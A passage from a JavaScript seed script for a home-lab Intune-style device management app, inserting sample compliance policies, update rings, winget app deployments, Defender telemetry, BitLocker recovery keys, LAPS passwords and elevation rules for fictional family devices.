          { id: 'firewall_all_profiles', category: 'Network & Firewall', name: 'Windows Defender Firewall (All Profiles)', desired_value: true, current_value: true, status: 'COMPLIANT', message: 'Domain, Private, and Public firewalls active' },
          { id: 'uac_enable_lua', category: 'User Account Control', name: 'UAC Admin Approval Mode (EnableLUA)', desired_value: 1, current_value: 1, status: 'COMPLIANT', message: 'EnableLUA configured to 1' },
          { id: 'rdp_nla', category: 'Remote Access', name: 'Remote Desktop Network Level Authentication (NLA)', desired_value: 1, current_value: 1, status: 'COMPLIANT', message: 'NLA enabled on RDP-Tcp' }
        ]),
        '-1 hour'
      );

      insertCompliance.run(
        'comp-02',
        'prof-win11-baseline',
        'dev-livingroom-pc',
        'NON_COMPLIANT',
        2, 1, 0,
        JSON.stringify([
          { id: 'firewall_all_profiles', category: 'Network & Firewall', name: 'Windows Defender Firewall (All Profiles)', desired_value: true, current_value: true, status: 'COMPLIANT', message: 'Domain, Private, and Public firewalls active' },
          { id: 'uac_enable_lua', category: 'User Account Control', name: 'UAC Admin Approval Mode (EnableLUA)', desired_value: 1, current_value: 0, status: 'NON_COMPLIANT', message: 'EnableLUA is currently 0 (disabled)' },
          { id: 'rdp_nla', category: 'Remote Access', name: 'Remote Desktop Network Level Authentication (NLA)', desired_value: 1, current_value: 1, status: 'COMPLIANT', message: 'NLA enabled on RDP-Tcp' }
        ]),
        '-30 minutes'
      );

      insertCompliance.run(
        'comp-03',
        'prof-gaming-tuning',
        'dev-daddy-pc',
        'COMPLIANT',
        1, 0, 0,
        JSON.stringify([
          { id: 'fast_startup', category: 'System & Power', name: 'Fast Startup (Hiberboot)', desired_value: 0, current_value: 0, status: 'COMPLIANT', message: 'Fast Startup disabled' }
        ]),
        '-2 hours'
      );
    }
  }

  // 8. Seed Default Windows Update Rings
  const ringCount = db.prepare('SELECT COUNT(*) as count FROM update_rings').get().count;
  if (ringCount === 0) {
    const insertRing = db.prepare(`
      INSERT INTO update_rings (
        id, name, description, target_group_id, servicing_channel, quality_deferral_days,
        feature_deferral_days, active_hours_start, active_hours_end, automatic_update_mode,
        restart_deadline_days, is_paused, created_at, updated_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 0, DATETIME('now', ?), DATETIME('now', ?))
    `);

    insertRing.run(
      'ring-fast-insider',
      'Ring 1: Homelab Fast & Canary Ring',
      'Early adoption ring for developer workstations and disposable VMs. 0 days deferral with 2-day reboot deadline.',
      'grp-workstations',
      'WindowsInsiderBeta',
      0, 0, 9, 18, 'AutoInstallAndRebootAtMaintenanceTime', 2,
      '-3 days', '-3 days'
    );

    insertRing.run(
      'ring-broad-production',
      'Ring 2: Broad Production Fleet',
      'Standard enterprise patch ring with 7-day quality update validation buffer and 5-day grace period.',
      'grp-all',
      'GeneralAvailability',
      7, 30, 8, 17, 'AutoInstallAndRebootAtMaintenanceTime', 5,
      '-2 days', '-2 days'
    );

    insertRing.run(
      'ring-gaming-vip',
      'Ring 3: Gaming & Low-Latency Rig Ring',
      'Extended active hours (08:00 - 02:00) and notify-download policy to prevent unwanted reboots during competitive play or long renders.',
      'grp-all',
      'GeneralAvailability',
      14, 90, 8, 2, 'NotifyDownload', 14,
      '-1 day', '-1 day'
    );

    // Sample device update status (if sample devices exist)
    const hasSampleDevForUpdate = db.prepare('SELECT id FROM devices WHERE id = ?').get('dev-daddy-pc');
    if (hasSampleDevForUpdate) {
      const insertDevUpdate = db.prepare(`
        INSERT INTO device_update_status (
          id, device_id, ring_id, reboot_pending, reboot_pending_reasons_json, last_scan_at,
          last_install_at, installed_hotfixes_json, update_service_status, compliance_status, updated_at
        ) VALUES (?, ?, ?, ?, ?, DATETIME('now', ?), DATETIME('now', ?), ?, 'Running', ?, DATETIME('now', ?))
      `);

      insertDevUpdate.run(
        'upd-01', 'dev-daddy-pc', 'ring-fast-insider', 0, '[]',
        '-2 hours', '-3 days',
        JSON.stringify([
          { hotfix_id: 'KB5043076', description: 'Security Update', installed_on: '2026-09-02' },
          { hotfix_id: 'KB5042099', description: 'Update', installed_on: '2026-08-20' }
        ]),
        'COMPLIANT', '-2 hours'
      );

      insertDevUpdate.run(
        'upd-02', 'dev-livingroom-pc', 'ring-broad-production', 1,
        JSON.stringify(['WindowsUpdate:KB5043076', 'ComponentBasedServicing:RebootPending']),
        '-45 minutes', '-1 day',
        JSON.stringify([
          { hotfix_id: 'KB5041585', description: 'Security Update', installed_on: '2026-08-15' }
        ]),
        'REBOOT_PENDING', '-45 minutes'
      );
    }
  }

  // 9. Seed Default Device Compliance Policies (Microsoft Intune Device Compliance)
  const compliancePolicyCount = db.prepare('SELECT COUNT(*) as count FROM compliance_policies').get().count;
  if (compliancePolicyCount === 0) {
    const insertPol = db.prepare(`
      INSERT INTO compliance_policies (
        id, name, description, target_group_id, platform, min_os_build,
        require_bitlocker, require_secure_boot, require_tpm, require_defender_antivirus,
        require_defender_rtp, require_firewall, max_antivirus_signature_age_days,
        grace_period_days, non_compliance_action, is_enabled, created_at, updated_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, DATETIME('now', ?), DATETIME('now', ?))
    `);

    insertPol.run(
      'pol-enterprise-baseline',
      'Windows 11 Enterprise Zero-Trust Compliance Policy',
      'Enforces BitLocker encryption, Secure Boot, TPM 2.0, Windows Defender RTP, and Firewall with a 3-day grace period.',
      'grp-all',
      'Windows11',
      '10.0.22000',
      1, 1, 1, 1, 1, 1, 7, 3, 'MARK_NON_COMPLIANT',
      '-3 days', '-3 days'
    );

    insertPol.run(
      'pol-strict-quarantine',
      'Strict Security & Anti-Tamper Policy (Workstations)',
      'Zero-tolerance anti-tamper policy. Devices missing Defender RTP or Firewall are immediately quarantined from the fleet.',
      'grp-workstations',
      'Windows11',
      '10.0.22621',
      1, 1, 1, 1, 1, 1, 3, 0, 'QUARANTINE',
      '-2 days', '-2 days'
    );

    insertPol.run(
      'pol-homelab-relaxed',
      'Homelab & Gaming Rig Relaxed Baseline',
      'Relaxed policy for personal gaming rigs and disposable test VMs with 7-day grace period and alert-only notifications.',
      'grp-all',
      'AllWindows',
      '10.0.19041',
      0, 0, 0, 1, 1, 0, 14, 7, 'ALERT_ONLY',
      '-1 day', '-1 day'
    );

    // Sample evaluations if sample devices exist
    const hasSampleDev = db.prepare('SELECT id FROM devices WHERE id = ?').get('dev-daddy-pc');
    if (hasSampleDev) {
      const insertEval = db.prepare(`
        INSERT INTO device_compliance_evaluations (
          id, device_id, policy_id, compliance_status, first_failed_at,
          grace_period_expires_at, rule_results_json, evaluated_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?))
      `);

      insertEval.run(
        'eval-01', 'dev-daddy-pc', 'pol-enterprise-baseline', 'COMPLIANT', null, null,
        JSON.stringify([
          { rule: 'min_os_build', expected: '10.0.22000', actual: '10.0.22631', passed: true },
          { rule: 'require_bitlocker', expected: true, actual: true, passed: true },
          { rule: 'require_secure_boot', expected: true, actual: true, passed: true },
          { rule: 'require_tpm', expected: true, actual: true, passed: true },
          { rule: 'require_defender_rtp', expected: true, actual: true, passed: true },
          { rule: 'require_firewall', expected: true, actual: true, passed: true }
        ]),
        '-1 hour'
      );

      insertEval.run(
        'eval-02', 'dev-livingroom-pc', 'pol-enterprise-baseline', 'IN_GRACE_PERIOD',
        new Date(Date.now() - 86400000).toISOString(),
        new Date(Date.now() + 2 * 86400000).toISOString(),
        JSON.stringify([
          { rule: 'min_os_build', expected: '10.0.22000', actual: '10.0.22631', passed: true },
          { rule: 'require_bitlocker', expected: true, actual: false, passed: false, error: 'BitLocker is not enabled on OS volume C:' },
          { rule: 'require_secure_boot', expected: true, actual: true, passed: true },
          { rule: 'require_tpm', expected: true, actual: true, passed: true },
          { rule: 'require_defender_rtp', expected: true, actual: true, passed: true },
          { rule: 'require_firewall', expected: true, actual: true, passed: true }
        ]),
        '-30 minutes'
      );
    }
  }

  // 10. Seed Intune Applications & Status
  const appCount = db.prepare('SELECT COUNT(*) as count FROM apps').get().count;
  if (appCount === 0) {
    const insertApp = db.prepare(`
      INSERT INTO apps (
        id, name, description, publisher, version, category, app_type,
        package_identifier, assignment_intent, target_group_id,
        install_command, uninstall_command, detection_rules_json, requirement_rules_json, is_enabled
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1)
    `);

    insertApp.run(
      'app-git',
      'Git for Windows',
      'Distributed version control system with Git Bash, Git GUI, and PowerShell CLI integration.',
      'Git for Windows Project',
      '2.44.0',
      'Developer Tools',
      'WINGET',
      'Git.Git',
      'REQUIRED',
      'grp-all',
      'winget install --id Git.Git --exact --silent --accept-source-agreements --accept-package-agreements',
      'winget uninstall --id Git.Git --exact --silent',
      JSON.stringify([
        { type: 'FILE', path: 'C:\\Program Files\\Git\\cmd\\git.exe', exists: true },
        { type: 'WINGET', package_id: 'Git.Git' }
      ]),
      JSON.stringify({ min_os_build: '10.0.19041', architecture: 'x64', min_ram_gb: 2, min_disk_free_gb: 2 })
    );

    insertApp.run(
      'app-vscode',
      'Visual Studio Code',
      'Lightweight but powerful source code editor with built-in support for JavaScript, TypeScript and Node.js.',
      'Microsoft',
      '1.98.0',
      'Developer Tools',
      'WINGET',
      'Microsoft.VisualStudioCode',
      'REQUIRED',
      'grp-workstations',
      'winget install --id Microsoft.VisualStudioCode --exact --silent --accept-source-agreements --accept-package-agreements',
      'winget uninstall --id Microsoft.VisualStudioCode --exact --silent',
      JSON.stringify([
        { type: 'FILE', path: 'C:\\Program Files\\Microsoft VS Code\\Code.exe', exists: true },
        { type: 'WINGET', package_id: 'Microsoft.VisualStudioCode' }
      ]),
      JSON.stringify({ min_os_build: '10.0.19041', architecture: 'x64', min_ram_gb: 4, min_disk_free_gb: 5 })
    );

    insertApp.run(
      'app-7zip',
      '7-Zip Archiver',
      'High compression ratio file archiver with AES-256 encryption and multi-format extraction.',
      'Igor Pavlov',
      '24.09',
      'Utilities',
      'WINGET',
      '7zip.7zip',
      'REQUIRED',
      'grp-all',
      'winget install --id 7zip.7zip --exact --silent --accept-source-agreements --accept-package-agreements',
      'winget uninstall --id 7zip.7zip --exact --silent',
      JSON.stringify([
        { type: 'FILE', path: 'C:\\Program Files\\7-Zip\\7z.exe', exists: true },
        { type: 'REGISTRY', path: 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\7-Zip', exists: true }
      ]),
      JSON.stringify({ min_os_build: '10.0.10240', architecture: 'x64', min_ram_gb: 1, min_disk_free_gb: 1 })
    );

    insertApp.run(
      'app-sysinternals',
      'Sysinternals Suite',
      'Technical troubleshooting utility suite for Windows systems including Process Explorer, ProcMon, and Autoruns.',
      'Microsoft',
      '2025.1',
      'System',
      'WINGET',
      'Microsoft.Sysinternals.Suite',
      'AVAILABLE',
      'grp-all',
      'winget install --id Microsoft.Sysinternals.Suite --exact --silent --accept-source-agreements --accept-package-agreements',
      'winget uninstall --id Microsoft.Sysinternals.Suite --exact --silent',
      JSON.stringify([
        { type: 'WINGET', package_id: 'Microsoft.Sysinternals.Suite' }
      ]),
      JSON.stringify({ min_os_build: '10.0.19041', architecture: 'x64', min_ram_gb: 2, min_disk_free_gb: 1 })
    );

    // Sample app statuses if sample devices exist
    const hasDaddy = db.prepare('SELECT id FROM devices WHERE id = ?').get('dev-daddy-pc');
    if (hasDaddy) {
      const insertStatus = db.prepare(`
        INSERT INTO device_app_status (
          id, device_id, app_id, install_status, detection_state, installed_version, last_attempt_at
        ) VALUES (?, ?, ?, ?, ?, ?, DATETIME('now', ?))
      `);
      insertStatus.run('app-stat-01', 'dev-daddy-pc', 'app-git', 'INSTALLED', 1, '2.44.0', '-2 hours');
      insertStatus.run('app-stat-02', 'dev-daddy-pc', 'app-vscode', 'INSTALLED', 1, '1.98.0', '-2 hours');
      insertStatus.run('app-stat-03', 'dev-daddy-pc', 'app-7zip', 'INSTALLED', 1, '24.09', '-2 hours');
    }
  }

  // 11. Seed Endpoint Security Policies & Defender Telemetry
  const secPolicyCount = db.prepare('SELECT COUNT(*) as count FROM endpoint_security_policies').get().count;
  if (secPolicyCount === 0) {
    const insertSecPol = db.prepare(`
      INSERT INTO endpoint_security_policies (
        id, name, description, target_group_id,
        real_time_protection, cloud_protection_level, controlled_folder_access,
        pua_protection, network_protection, tamper_protection,
        scan_schedule_type, scan_schedule_time, exclusions_json, is_enabled
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1)
    `);

    insertSecPol.run(
      'sec-baseline-enterprise',
      'Microsoft Defender Enterprise Baseline',
      'Standard enterprise security posture with High cloud protection, PUA blocking, Network Protection, and daily Quick Scans.',
      'grp-all',
      1, 'HIGH', 'AUDIT', 'ENABLED', 'ENABLED', 1, 'DAILY_QUICK', '02:00',
      JSON.stringify({ paths: [], extensions: [], processes: [] })
    );

    insertSecPol.run(
      'sec-ransomware-shield',
      'High-Security Ransomware Shield & Controlled Folders',
      'Strict zero-trust anti-ransomware configuration enforcing Controlled Folder Access, High+ cloud ML, and blocked script execution.',
      'grp-workstations',
      1, 'HIGH_PLUS', 'ENABLED', 'ENABLED', 'ENABLED', 1, 'DAILY_QUICK', '03:00',
      JSON.stringify({ paths: ['C:\\SecureVault'], extensions: [], processes: [] })
    );

    insertSecPol.run(
      'sec-dev-gaming',
      'Developer & High-Performance Rig Exclusions',
      'Optimized Defender configuration with developer directory exclusions (.git, node_modules, target) for maximum build speed.',
      'grp-workstations',
      1, 'STANDARD', 'AUDIT', 'ENABLED', 'ENABLED', 1, 'WEEKLY_FULL', '04:00',
      JSON.stringify({ paths: ['C:\\temp', 'C:\\dev'], extensions: ['.obj', '.pdb'], processes: ['node.exe', 'cargo.exe'] })
    );

    // Seed Defender telemetry for sample devices
    const hasDaddy = db.prepare('SELECT id FROM devices WHERE id = ?').get('dev-daddy-pc');
    if (hasDaddy) {
      const insertAv = db.prepare(`
        INSERT INTO device_antivirus_status (
          id, device_id, antivirus_enabled, engine_version, product_version,
          signature_version, signature_last_updated, signature_age_days,
          real_time_protection_enabled, cloud_protection_enabled, pua_protection_enabled,
          controlled_folder_access_enabled, network_protection_enabled, tamper_protection_enabled,
          antispyware_enabled, behavior_monitor_enabled, ioav_protection_enabled,
          last_quick_scan_at, last_full_scan_at, quick_scan_age_days, full_scan_age_days,
          active_threat_count, updated_at
        ) VALUES (?, ?, ?, ?, ?, ?, DATETIME('now', ?), ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?), DATETIME('now', ?), ?, ?, ?, DATETIME('now'))
      `);

      insertAv.run(
        'av-daddy-01', 'dev-daddy-pc', 1, '1.1.24020.9', '4.18.24020.7',
        '1.407.382.0', '-1 hours', 0,
        1, 1, 1, 1, 1, 1, 1, 1, 1,
        '-4 hours', '-3 days', 0, 3, 0
      );

      insertAv.run(
        'av-living-01', 'dev-livingroom-pc', 1, '1.1.24010.5', '4.18.24010.3',
        '1.405.120.0', '-8 days', 8,
        0, 1, 1, 0, 0, 1, 1, 0, 1,
        '-9 days', '-20 days', 9, 20, 1
      );

      insertAv.run(
        'av-sarah-01', 'dev-sarah-laptop', 1, '1.1.24020.9', '4.18.24020.7',
        '1.407.290.0', '-1 day', 1,
        1, 1, 1, 2, 1, 1, 1, 1, 1,
        '-1 day', '-7 days', 1, 7, 0
      );

      // Seed threat detection on livingroom PC
      const insertThreat = db.prepare(`
        INSERT INTO threat_detections (
          id, device_id, threat_name, threat_id, severity, category,
          resources_json, action_taken, remediation_status, detected_at, created_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?), DATETIME('now', ?))
      `);

      insertThreat.run(
        'threat-01', 'dev-livingroom-pc', 'Trojan:Win32/Wacatac.B!ml', '2147735503',
        'HIGH', 'Trojan',
        JSON.stringify(['C:\\Users\\Family\\Downloads\\keygen.exe']),
        'QUARANTINED', 'ACTIVE', '-2 hours', '-2 hours'
      );

      insertThreat.run(
        'threat-02', 'dev-daddy-pc', 'PUA:Win32/CoinMiner', '2147741201',
        'MEDIUM', 'PotentiallyUnwantedApp',
        JSON.stringify(['C:\\temp\\miner_bench.exe']),
        'BLOCKED', 'RESOLVED', '-5 days', '-5 days'
      );
    }
  }

  // 12. BitLocker Policies, Volumes & Escrowed Keys
  const bitPolCount = db.prepare('SELECT COUNT(*) as count FROM bitlocker_policies').get().count;
  if (bitPolCount === 0) {
    const insertBitPol = db.prepare(`
      INSERT OR IGNORE INTO bitlocker_policies (
        id, name, description, target_group_id, encryption_method_os, encryption_method_fixed,
        require_tpm, recovery_key_rotation, hide_recovery_options_in_wizard, silent_encryption_enabled, is_enabled
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertBitPol.run(
      'bit-baseline-enterprise',
      'Enterprise Silent BitLocker Baseline',
      'Enforces silent XTS-AES 128-bit hardware encryption for all Windows operating system drives with TPM protector and automated recovery key escrow.',
      'grp-all',
      'XtsAes128', 'XtsAes128',
      1, 1, 1, 1, 1
    );

    insertBitPol.run(
      'bit-high-security',
      'High-Assurance Military Grade BitLocker',
      'Maximum security configuration requiring XTS-AES 256-bit encryption cipher and strict recovery password vaulting.',
      'grp-workstations',
      'XtsAes256', 'XtsAes256',
      1, 1, 1, 1, 1
    );

    // Seed BitLocker volumes for sample devices
    const hasDaddy = db.prepare('SELECT id FROM devices WHERE id = ?').get('dev-daddy-pc');
    if (hasDaddy) {
      const insertVol = db.prepare(`
        INSERT OR IGNORE INTO device_bitlocker_volumes (
          id, device_id, mount_point, volume_type, protection_status, volume_status,
          encryption_percentage, encryption_method, lock_status, key_protector_types_json, has_recovery_key, updated_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?))
      `);

      insertVol.run('vol-daddy-c', 'dev-daddy-pc', 'C:', 'OperatingSystem', 'On', 'FullyEncrypted', 100.0, 'XtsAes128', 'Unlocked', JSON.stringify(['Tpm', 'RecoveryPassword']), 1, '-2 hours');
      insertVol.run('vol-daddy-d', 'dev-daddy-pc', 'D:', 'FixedDataVolume', 'On', 'FullyEncrypted', 100.0, 'XtsAes128', 'Unlocked', JSON.stringify(['RecoveryPassword']), 1, '-2 hours');
      insertVol.run('vol-sarah-c', 'dev-sarah-laptop', 'C:', 'OperatingSystem', 'On', 'FullyEncrypted', 100.0, 'XtsAes128', 'Unlocked', JSON.stringify(['Tpm', 'RecoveryPassword']), 1, '-1 day');
      insertVol.run('vol-living-c', 'dev-livingroom-pc', 'C:', 'OperatingSystem', 'Off', 'FullyDecrypted', 0.0, 'None', 'Unlocked', JSON.stringify([]), 0, '-3 days');

      const insertKey = db.prepare(`
        INSERT OR IGNORE INTO bitlocker_recovery_keys (
          id, device_id, volume_mount_point, volume_type, key_protector_id,
          key_protector_type, recovery_password, encryption_method, backup_timestamp, last_accessed_at, access_count
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?), ?, ?)
      `);

      insertKey.run(
        'key-daddy-c', 'dev-daddy-pc', 'C:', 'OperatingSystem',
        '{E28B0F25-A2B8-439D-B147-9D72E15C0391}', 'RecoveryPassword',
        '419204-182940-582910-384910-184920-582910-482910-582910', 'XtsAes128',
        '-5 days', '2026-09-06 14:20:00', 1
      );

      insertKey.run(
        'key-daddy-d', 'dev-daddy-pc', 'D:', 'FixedDataVolume',
        '{98FA1204-512E-442C-B4A1-28CBA0249210}', 'RecoveryPassword',
        '629104-582910-184920-384910-482910-182940-582910-384910', 'XtsAes128',
        '-5 days', null, 0
      );

      insertKey.run(
        'key-sarah-c', 'dev-sarah-laptop', 'C:', 'OperatingSystem',
        '{B3920194-612A-438B-9321-482910482910}', 'RecoveryPassword',
        '194820-384910-582910-482910-182940-629104-384910-184920', 'XtsAes128',
        '-2 days', null, 0
      );

      const insertAudit = db.prepare(`
        INSERT OR IGNORE INTO bitlocker_audit_logs (
          id, key_id, device_id, accessed_by, access_reason, ip_address, accessed_at
        ) VALUES (?, ?, ?, ?, ?, ?, DATETIME('now', ?))
      `);

      insertAudit.run(
        'audit-01', 'key-daddy-c', 'dev-daddy-pc',
        'Tony (Fleet Admin)', 'Scheduled annual disaster recovery drill',
        '127.0.0.1', '-1 day'
      );
    }
  }

  // 13. LAPS Policies, Passwords & Audit Logs
  const lapsPolCount = db.prepare('SELECT COUNT(*) as count FROM laps_policies').get().count;
  if (lapsPolCount === 0) {
    const insertLapsPol = db.prepare(`
      INSERT OR IGNORE INTO laps_policies (
        id, name, description, target_group_id, admin_account_name, password_complexity,
        password_length, password_age_days, post_auth_reset_enabled, post_auth_reset_delay_hours, auto_enable_account, is_enabled
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertLapsPol.run(
      'laps-enterprise-baseline',
      'Windows 11 Enterprise LAPS Baseline',
      'Enforces 16-character complex password rotation every 30 days on built-in Administrator account with automated escrow and zero-trust masking.',
      'grp-all', 'Administrator', 'COMPLEX', 16, 30, 0, 4, 1, 1
    );

    insertLapsPol.run(
      'laps-workstations-strict',
      'High-Assurance Workstation LAPS',
      'Maximum complexity 24-character password rotated every 14 days with post-authentication reset for dedicated developer and gaming rigs.',
      'grp-workstations', 'Administrator', 'COMPLEX', 24, 14, 1, 2, 1, 1
    );

    insertLapsPol.run(
      'laps-family-standard',
      'Family Fleet Standard Admin LAPS',
      'Rotates custom LocalAdmin account every 60 days with 14-character alphanumeric password for shared family laptops.',
      'grp-family-laptops', 'LocalAdmin', 'ALPHANUMERIC', 14, 60, 0, 4, 1, 1
    );

    // Seed sample LAPS credentials if sample devices exist
    const hasDaddy = db.prepare('SELECT id FROM devices WHERE id = ?').get('dev-daddy-pc');
    if (hasDaddy) {
      const insertPwd = db.prepare(`
        INSERT OR IGNORE INTO laps_passwords (
          id, device_id, account_name, encrypted_password, password_length,
          complexity_level, last_rotated_at, expires_at, rotation_status, last_accessed_at, access_count, updated_at
        ) VALUES (?, ?, ?, ?, ?, ?, DATETIME('now', ?), DATETIME('now', ?), ?, DATETIME('now', ?), ?, DATETIME('now'))
      `);

      insertPwd.run(
        'laps-pwd-daddy', 'dev-daddy-pc', 'Administrator',
        'Kp9#mX2$vL5*qR8!', 16, 'COMPLEX',
        '-5 days', '+25 days', 'ACTIVE', '-1 day', 1
      );

      insertPwd.run(
        'laps-pwd-sarah', 'dev-sarah-laptop', 'LocalAdmin',
        '7nK3#pW9@xR2$vM8', 16, 'COMPLEX',
        '-28 days', '+2 days', 'ACTIVE', null, 0
      );

      insertPwd.run(
        'laps-pwd-living', 'dev-livingroom-pc', 'Administrator',
        '9vL2#mK8$pX5*qR3', 16, 'COMPLEX',
        '-45 days', '-15 days', 'EXPIRED', null, 0
      );

      const insertLapsAudit = db.prepare(`
        INSERT OR IGNORE INTO laps_audit_logs (
          id, device_id, account_name, action, accessed_by, access_reason, ip_address, accessed_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?))
      `);

      insertLapsAudit.run(
        'laps-audit-01', 'dev-daddy-pc', 'Administrator', 'REVEAL',
        'Tony (Fleet Admin)', 'Scheduled maintenance & local service reconfiguration',
        '127.0.0.1', '-1 day'
      );
    }
  }

  // 14. EPM Policies, Rules, Requests & Elevation Logs
  const epmPolCount = db.prepare('SELECT COUNT(*) as count FROM epm_policies').get().count;
  if (epmPolCount === 0) {
    const insertEpmPol = db.prepare(`
      INSERT OR IGNORE INTO epm_policies (
        id, name, description, target_group_id, default_elevation_action, send_elevation_telemetry, is_enabled
      ) VALUES (?, ?, ?, ?, ?, ?, ?)
    `);

    insertEpmPol.run(
      'epm-enterprise-baseline',
      'Enterprise Standard Elevation Policy',
      'Requires justification for administrative utility elevation and automatically audits elevated child processes.',
      'grp-all', 'REQUIRE_JUSTIFICATION', 1, 1
    );

    insertEpmPol.run(
      'epm-workstations-dev',
      'Developer & Engineering Rig Elevation Policy',
      'Auto-elevates approved dev and debugging tools with full hash verification and support-approved approval workflows.',
      'grp-workstations', 'REQUIRE_JUSTIFICATION', 1, 1
    );

    const insertEpmRule = db.prepare(`
      INSERT OR IGNORE INTO epm_elevation_rules (
        id, policy_id, rule_name, description, elevation_type, file_name, file_path, file_hash_sha256,
        publisher_certificate, child_process_rule, min_file_version, max_file_version, is_enabled
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertEpmRule.run(
      'rule-procexp', 'epm-enterprise-baseline',
      'Sysinternals Process Explorer',
      'Allows standard users to run Process Explorer elevated with documented justification',
      'USER_CONFIRMED', 'procexp.exe', 'C:\\Program Files\\Sysinternals\\procexp.exe',
      'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
      'Microsoft Corporation', 'ELEVATE_ALL_CHILDREN', null, null, 1
    );

    insertEpmRule.run(
      'rule-winget', 'epm-enterprise-baseline',
      'Windows Package Manager CLI',
      'Automatically elevates winget command line for background package deployment',
      'AUTOMATIC', 'winget.exe', 'C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_*\\winget.exe',
      null, 'Microsoft Corporation', 'ELEVATE_NONE', null, null, 1
    );

    insertEpmRule.run(
      'rule-wireshark', 'epm-workstations-dev',
      'Wireshark Network Analyzer',
      'Requires operator support approval before capturing raw packets with Npcap',
      'SUPPORT_APPROVED', 'Wireshark.exe', 'C:\\Program Files\\Wireshark\\Wireshark.exe',
      '8f434346648f6b96df89dda901c5176b10e6d05961fc5be67dfb9fb6330742d0',
      'Wireshark Foundation', 'ELEVATE_NONE', null, null, 1
    );

    insertEpmRule.run(
      'rule-afterburner', 'epm-workstations-dev',
      'MSI Afterburner Hardware Monitor',
      'Allows hardware tuning and GPU metrics monitoring under user confirmation',
      'USER_CONFIRMED', 'MSIAfterburner.exe', 'C:\\Program Files (x86)\\MSI Afterburner\\MSIAfterburner.exe',
      null, 'Micro-Star International Co., Ltd.', 'ELEVATE_NONE', null, null, 1
    );

    // Seed sample request & log if sample devices exist
    const hasDaddy = db.prepare('SELECT id FROM devices WHERE id = ?').get('dev-daddy-pc');
    if (hasDaddy) {
      const insertReq = db.prepare(`
        INSERT OR IGNORE INTO epm_elevation_requests (
          id, device_id, rule_id, requested_by_user, file_path, file_name,
          file_hash_sha256, file_version, justification, status, reviewed_by, reviewed_at, review_notes, expires_at, created_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?), ?, DATETIME('now', ?), DATETIME('now', ?))
      `);

      insertReq.run(
        'epm-req-01', 'dev-daddy-pc', 'rule-wireshark', 'Tony',
        'C:\\Program Files\\Wireshark\\Wireshark.exe', 'Wireshark.exe',
        '8f434346648f6b96df89dda901c5176b10e6d05961fc5be67dfb9fb6330742d0', '4.2.4',
        'Investigating intermittent DHCP dropouts on 10GbE network interface',
        'APPROVED', 'Fleet Master (Auto)', '-1 hour', 'Granted for 4 hours diagnostic window', '+3 hours', '-1 hour'
      );

      insertReq.run(
        'epm-req-02', 'dev-sarah-laptop', 'rule-procexp', 'Sarah',
        'C:\\Program Files\\Sysinternals\\procexp.exe', 'procexp.exe',
        'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', '17.05',
        'Need to inspect high background fan noise during photo export',
        'PENDING', null, null, null, null, '-10 minutes'
      );

      const insertLog = db.prepare(`
        INSERT OR IGNORE INTO epm_elevation_logs (
          id, device_id, rule_id, user_name, file_path, file_name,
          file_hash_sha256, elevation_type, justification, process_id, parent_process_name, executed_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?))
      `);

      insertLog.run(
        'epm-log-01', 'dev-daddy-pc', 'rule-procexp', 'Tony',
        'C:\\Program Files\\Sysinternals\\procexp.exe', 'procexp.exe',
        'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
        'USER_CONFIRMED', 'Auditing thread affinity on 13900K E-cores',
        14280, 'explorer.exe', '-2 hours'
      );

      insertLog.run(
        'epm-log-02', 'dev-daddy-pc', 'rule-winget', 'Tony',
        'C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_*\\winget.exe', 'winget.exe',
        null, 'AUTOMATIC', 'Background upgrade of Git for Windows',
        18944, 'powershell.exe', '-45 minutes'
      );
    }
  }

  // 15. Autopilot Profiles, Devices, ESP Policies & Provisioning Events
  const apProfCount = db.prepare('SELECT COUNT(*) as count FROM autopilot_profiles').get().count;
  if (apProfCount === 0) {
    const insertApProf = db.prepare(`
      INSERT OR IGNORE INTO autopilot_profiles (
        id, name, description, deployment_mode, join_type, account_type,
        language_locale, keyboard_layout, device_name_template,
        skip_eula, skip_privacy_settings, skip_user_licensing,
        target_group_id, is_default
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertApProf.run(
      'ap-prof-standard',
      'Standard Enterprise Workstation',
      'User-driven deployment with standard user privileges, automated naming, and streamlined OOBE privacy skips.',
      'USER_DRIVEN', 'WORKGROUP_LOCAL', 'STANDARD',
      'en-US', '0409:00000409', 'FLEET-WK-%RAND:4%',
      1, 1, 1, 'grp-all', 1
    );

    insertApProf.run(
      'ap-prof-kiosk',
      'Self-Deploying Lab & Kiosk Rig',
      'Zero-touch self-deploying profile granting local administrative privileges for homelab virtualization and automated testing rigs.',
      'SELF_DEPLOYING', 'WORKGROUP_LOCAL', 'ADMINISTRATOR',
      'en-US', '0409:00000409', 'FLEET-LAB-%RAND:4%',
      1, 1, 1, 'grp-workstations', 0
    );

    const insertEsp = db.prepare(`
      INSERT OR IGNORE INTO enrollment_status_page_policies (
